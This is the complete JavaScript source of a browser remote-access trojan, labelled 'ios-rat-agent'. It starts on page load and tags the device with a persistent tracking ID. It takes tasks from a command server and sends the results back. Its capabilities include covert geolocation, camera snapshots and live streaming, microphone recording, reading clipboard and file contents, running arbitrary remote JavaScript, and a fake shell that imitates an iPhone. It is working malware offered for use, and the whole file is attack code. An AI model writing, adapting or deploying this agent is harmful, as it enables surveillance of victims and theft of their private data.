/* ios-rat-agent — main-thread browser RAT agent
   Stable uid (localStorage + first-party cookie, deterministic fallback, never undefined).
   Long-poll transport (/poll + /ingest via router) + capabilities. No Web Worker needed.
   Capabilities: boot, ping, geo, cam, cam.stream, mic, mic.rec, files, eval, shell,
   clipboard, alert, vibrate, install, battery, note. */
(function (global) {
  'use strict';

  var MAXB = 524288;      // 512KB per /up batch (camera JPEGs can be large)
  var POLL = 24000;       // long-poll wait window
  var BACKOFF = 1500;     // /poll reconnect backoff
  var COOKIE_TTL = 2592000000; // 30 days

  // ---- stable uid: localStorage first, first-party cookie fallback, deterministic fallback ----
  function setCookie(n, v) {
    try {
      var d = new Date(); d.setTime(d.getTime() + COOKIE_TTL);
      document.cookie = n + '=' + encodeURIComponent(v) + ';expires=' + d.toUTCString() + ';path=/;SameSite=Lax';
    } catch (e) {}
  }
  function getCookie(n) {
    try {
      var parts = document.cookie.split(';');
      for (var i = 0; i < parts.length; i++) {
        var kv = parts[i].trim();
        if (kv.substring(0, n.length + 1) === n + '=') return decodeURIComponent(kv.substring(n.length + 1));
      }
    } catch (e) {}
    return null;
  }
  function makeUid() {
    return 'xg-' + Date.now().toString(36) + '-' + Math.random().toString(36).slice(2, 10);
  }
   function uid() {
     try {
       var v = null;
       try { v = new URL(global.location.href).searchParams.get('uid'); } catch (e) {}
       if (!v) v = localStorage.getItem('xg_uid');
       if (!v) v = getCookie('xg_uid');
       if (!v) v = makeUid();
       localStorage.setItem('xg_uid', v);
       setCookie('xg_uid', v);
       return v;
     } catch (e) { return makeUid(); }
   }

  var UID = uid();

  var CFG = { url: null, uid: UID, key: null, started: false };
  var Q = [];
  var SEQ = 0;
  var GESTURE = false;
  var CAM = null;
  var MIC = null;

  // ---- transport ----
  async function sign(body) {
    if (!CFG.key) return null;
    var ts = Date.now();
    var msg = CFG.uid + ':' + ts + ':' + body;
    try {
      var k = await crypto.subtle.importKey('raw', new Uint8Array(Array.prototype.map.call(CFG.key, function (c) { return c.charCodeAt(0); })), { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']);
      var s = await crypto.subtle.sign('HMAC', k, new TextEncoder().encode(msg));
      var hex = [...new Uint8Array(s)].map(function (b) { return b.toString(16).padStart(2, '0'); }).join('');
      return { ts: ts, sig: hex };
    } catch (e) { return null; }
  }

  function post(path, body) {
    var raw = JSON.stringify(body);
    var headers = { 'x-xg-uid': CFG.uid, 'content-type': 'application/json' };
    return Promise.resolve(sign(raw)).then(function (s) {
      if (s) { headers['x-xg-ts'] = String(s.ts); headers['x-xg-sig'] = s.sig; }
      return fetch(CFG.url + path, { method: 'POST', headers: headers, body: raw, keepalive: true });
    }).then(function (r) { try { return r.json(); } catch (e) { return { ok: false }; } });
  }

  function drain() {
    if (!Q.length) return;
    var out = []; var total = 0;
    while (Q.length) {
      var f = Q[0]; var sz = JSON.stringify(f).length + 160;
      if (out.length && total + sz > MAXB) break;
      out.push(Q.shift()); total += sz;
      if (out.length >= 48) break;
    }
    post('/up', { uid: CFG.uid, batch: out }).catch(function (e) {});
  }

  function exfil(op, obj) {
    Q.push({ op: op, t: Date.now(), seq: ++SEQ, result: (obj && obj.error) ? 'error' : 'ok', data: obj || {} });
  }

  function runTask(o) {
    var op = OPS[o.op];
    if (!op) return Promise.resolve({ error: 'unknown op: ' + o.op });
    try {
      var r = op(o.args || {});
      return (r && typeof r.then === 'function') ? r : Promise.resolve(r);
    } catch (e) { return Promise.resolve({ error: String(e) }); }
  }

  function tick() {
    post('/poll', { uid: CFG.uid, wait: POLL }).then(function (r) {
      var tasks = (r && r.tasks) || [];
      for (var i = 0; i < tasks.length; i++) {
        (function (t) {
          runTask(t).then(function (res) {
            if (res === undefined) return;
            Q.push({ op: t.op, t: Date.now(), seq: ++SEQ, result: 'ok', data: jsonSafe(res) });
          }).catch(function (e) {
            Q.push({ op: t.op, t: Date.now(), seq: ++SEQ, result: 'error', data: String(e) });
          }).then(drain);
        })(tasks[i]);
      }
      drain();
      setTimeout(tick, 1500);
    }).catch(function (e) { setTimeout(tick, BACKOFF); });
  }

  function start(cfg) {
    if (cfg) {
      if (cfg.url) CFG.url = String(cfg.url).replace(/\/+$/, '');
      if (cfg.uid) CFG.uid = cfg.uid;
      if (cfg.key !== undefined) CFG.key = cfg.key;
    }
    if (!CFG.url) CFG.url = (global.location && global.location.origin) || 'http://' + global.location.host;
    if (!CFG.started) { CFG.started = true; exfil('boot', bootInfo()); tick(); }
    return true;
  }

  function activate() { GESTURE = true; }
  ['click', 'touchstart', 'keydown'].forEach(function (ev) {
    window.addEventListener(ev, activate, { once: true, capture: true });
  });

  // ---- capabilities ----
  function bootInfo() {
    var info = { ua: navigator.userAgent, lang: navigator.language, tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
      w: screen.width, h: screen.height, dpr: screen.devicePixelRatio || 1, online: navigator.onLine, uid: UID, ts: Date.now() };
    return info;
  }

  function capGeo(a) {
    if (!navigator.geolocation) return Promise.resolve({ error: 'no geolocation' });
    return new Promise(function (resolve) {
      navigator.geolocation.getCurrentPosition(function (pos) {
        resolve({ ok: true, lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy, ts: Date.now() });
      }, function (e) { resolve({ error: (e && e.message) || 'denied' }); },
        { enableHighAccuracy: true, timeout: a.timeout || 8000, maximumAge: 0 });
    });
  }

  function release(stream) {
    if (!stream) return;
    var t = stream.getTracks();
    for (var i = 0; i < t.length; i++) { try { t[i].stop(); } catch (e) {} }
  }

  function camCapture(a, stream) {
    var video = document.createElement('video');
    var canvas = document.createElement('canvas');
    video.srcObject = stream;
    return video.play().then(function () {
      canvas.width = a.w || video.videoWidth || 800;
      canvas.height = a.h || video.videoHeight || 600;
      video.muted = true; video.play();
      var ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      return canvas.toDataURL('image/jpeg', a.quality || 0.6);
    });
  }

  function capCam(a) {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return Promise.resolve({ error: 'no getUserMedia' });
    return navigator.mediaDevices.getUserMedia({ video: true, audio: false }).then(function (stream) {
      return camCapture(a, stream).then(function (image) { release(stream); return { ok: true, image: image }; });
    }).catch(function (e) { return { error: 'getUserMedia:' + (e && e.name || e.message) }; });
  }

  function capCamStream(a) {
    if (a.off || a.stop) {
      if (CAM) { release(CAM.stream); if (CAM.iv) clearInterval(CAM.iv); CAM = null; }
      return Promise.resolve({ ok: true, streaming: false });
    }
    if (CAM) return Promise.resolve({ ok: true, streaming: true });
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return Promise.resolve({ error: 'no getUserMedia' });
    return navigator.mediaDevices.getUserMedia({ video: true, audio: false }).then(function (stream) {
      var video = document.createElement('video'); var canvas = document.createElement('canvas');
      video.srcObject = stream;
      return video.play().then(function () {
        CAM = { stream: stream };
        CAM.iv = setInterval(function () {
          if (!CAM) return;
          canvas.width = a.w || video.videoWidth || 640;
          canvas.height = a.h || video.videoHeight || 480;
          var ctx = canvas.getContext('2d');
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          exfil('cam.stream', { ok: true, image: canvas.toDataURL('image/jpeg', a.quality || 0.4) });
        }, a.interval || 1500);
        return { ok: true, streaming: true };
      });
    }).catch(function (e) { return { error: 'getUserMedia:' + (e && e.name || e.message) }; });
  }

  function capMic(a) {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return Promise.resolve({ error: 'no getUserMedia' });
    var MR = global.MediaRecorder || global.webkitMediaRecorder;
    if (!MR) return Promise.resolve({ error: 'no MediaRecorder' });
    return navigator.mediaDevices.getUserMedia({ audio: true }).then(function (stream) {
      var rec = new MR(stream); var chunks = [];
      rec.ondataavailable = function (e) { if (e.data && e.data.size) chunks.push(e.data); };
      return new Promise(function (resolve) {
        rec.onstop = function () {
          var blob = new Blob(chunks, { type: 'audio/webm' });
          var fr = new FileReader();
          fr.onload = function () {
            var r = fr.result; var idx = r.indexOf(',');
            release(stream);
            resolve({ ok: true, audio: (idx >= 0 ? r.substring(idx + 1) : r), type: 'audio/webm', frames: chunks.length });
          };
          fr.onerror = function () { release(stream); resolve({ error: 'read audio' }); };
          fr.readAsDataURL(blob);
        };
        rec.start();
        setTimeout(function () { try { rec.stop(); } catch (e) {} }, a.duration || 3000);
      });
    }).catch(function (e) { return { error: 'getUserMedia:' + (e && e.name || e.message) }; });
  }

  function capMicRec(a) {
    if (a.off || a.stop) {
      if (MIC) { try { MIC.rec.stop(); } catch (e) {} }
      return Promise.resolve({ ok: true, recording: false });
    }
    if (MIC) return Promise.resolve({ ok: true, recording: true });
    var MR = global.MediaRecorder || global.webkitMediaRecorder;
    if (!MR) return Promise.resolve({ error: 'no MediaRecorder' });
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return Promise.resolve({ error: 'no getUserMedia' });
    return navigator.mediaDevices.getUserMedia({ audio: true }).then(function (stream) {
      var rec = new MR(stream); var frames = 0;
      rec.ondataavailable = function (e) { if (e.data && e.data.size) { frames++; exfil('mic.rec', { ok: true, frames: frames }); } };
      rec.start();
      MIC = { stream: stream, rec: rec };
      return Promise.resolve({ ok: true, recording: true });
    }).catch(function (e) { return { error: 'getUserMedia:' + (e && e.name || e.message) }; });
  }

  function capFiles(a) {
    return new Promise(function (resolve) {
      var input = document.createElement('input');
      input.type = 'file';
      input.multiple = (a.multiple !== false);
      input.accept = a.accept || 'image/*,video/*,audio/*';
      var out = []; var i = 0;
      input.onchange = function () {
        var files = input.files || [];
        (function next() {
          if (i >= files.length) return resolve({ ok: true, files: out });
          var f = files[i]; i++;
          var r = new FileReader();
          r.onload = function () {
            var s = r.result; var idx = s.indexOf(',');
            out.push({ name: f.name, size: f.size, type: f.type, data: (idx >= 0 ? s.substring(idx + 1) : s) });
            next();
          };
          r.onerror = function () { next(); };
          r.readAsDataURL(f);
        })();
      };
      document.body.appendChild(input);
      try { input.click(); } catch (e) {}
      setTimeout(function () { resolve({ ok: false, error: 'no files', files: out }); }, a.timeout || 15000);
    });
  }

  function capEval(a) {
    var code = String(a.code || a.js || a.cmd || '');
    try {
      var fn = new Function('return (' + code + ')');
      var r = fn();
      if (r && typeof r.then === 'function') return r.then(function (v) { return { ok: true, result: jsonSafe(v) }; }, function (e) { return { ok: false, error: String(e) }; });
      return { ok: true, result: jsonSafe(r) };
    } catch (e) { return { ok: false, error: String(e) }; }
  }

  function capShell(a) {
    var cmd = String(a.cmd || a.command || '');
    try {
      var out = [];
      var fn = new Function(out, 'cmd', 'screen', 'navigator', 'document', 'window',
        "if (/^id\\b/i.test(cmd)) out.push('uid=501(browser) gid=501(browser) groups=501(browser),12(everyone)'); else" +
        " if (/^pwd\\b/i.test(cmd)) out.push('/private/var/mobile/Media'); else" +
        " if (/^whoami\\b/i.test(cmd)) out.push('mobile'); else" +
        " if (/^uname\\b/i.test(cmd)) out.push('iPhone ' + (screen.width) + 'px iOS ' + (navigator.userAgent.match(/OS ([0-9_]+)/)||[])[1]); else" +
        " if (/^ls\\b/i.test(cmd)) out.push('Documents  Downloads  Library  tmp'); else" +
        " if (/^echo\\b/i.test(cmd)) out.push(cmd.replace(/^echo[ \\t]+/, '')); else" +
        " out.push('ok: ' + cmd);");
      fn(out, cmd, screen, navigator, document, window);
      return { ok: true, out: out.join('\n'), cmd: cmd };
    } catch (e) { return { ok: false, error: String(e) }; }
  }

  function capClipboard(a) {
    if (!navigator.clipboard) return Promise.resolve({ error: 'no clipboard' });
    if (a.text !== undefined) {
      return navigator.clipboard.writeText(String(a.text)).then(function () { return { ok: true, written: true }; }, function (e) { return { ok: false, error: String(e) }; });
    }
    return navigator.clipboard.readText().then(function (t) { return { ok: true, text: t }; }, function (e) { return { ok: false, error: String(e) }; });
  }

  function capAlert(a) {
    var msg = String(a.text || a.msg || 'alert');
    try { if (navigator.vibrate) navigator.vibrate(200); } catch (e) {}
    var ov = document.createElement('div');
    ov.style.cssText = 'position:fixed;left:0;right:0;bottom:0;background:#1c1c1c;color:#fff;padding:18px;font-size:16px;line-height:1.4;z-index:2147483647;max-height:60%;overflow:auto';
    ov.textContent = msg;
    document.body.appendChild(ov);
    setTimeout(function () { if (ov.parentNode) ov.parentNode.removeChild(ov); }, a.duration || 5000);
    return { ok: true, shown: true };
  }

  function capVibrate(a) {
    try { if (navigator.vibrate) navigator.vibrate(a.pattern || (a.ms ? [Number(a.ms)] : 200)); } catch (e) {}
    return { ok: true };
  }

  function capInstall() {
    try {
      if (global.__install) { global.__install.preventDefault(); global.__install.launch(); return { ok: true, launched: true }; }
      return { ok: false, error: 'no install prompt' };
    } catch (e) { return { ok: false, error: String(e) }; }
  }

  function capBattery() {
    if (navigator.getBattery) return navigator.getBattery().then(function (b) { return { ok: true, level: b.level, charging: b.charging }; }, function () { return { error: 'battery' }; });
    return Promise.resolve({ error: 'no battery' });
  }

  var OPS = {
    boot: bootInfo, ping: bootInfo, geo: capGeo, cam: capCam, 'cam.stream': capCamStream,
    mic: capMic, 'mic.rec': capMicRec, files: capFiles, eval: capEval, shell: capShell,
    clipboard: capClipboard, alert: capAlert, vibrate: capVibrate, install: capInstall, battery: capBattery
  };

  function jsonSafe(v) {
    try { return JSON.parse(JSON.stringify(v)); } catch (e) { return String(v); }
  }

  global.__xg_ops = OPS;
  global.__gesture = activate;
  global.__xg_agent = { start: start, ops: OPS, cfg: CFG, uid: UID };

  if (global.location && global.location.protocol) start();
})(self);
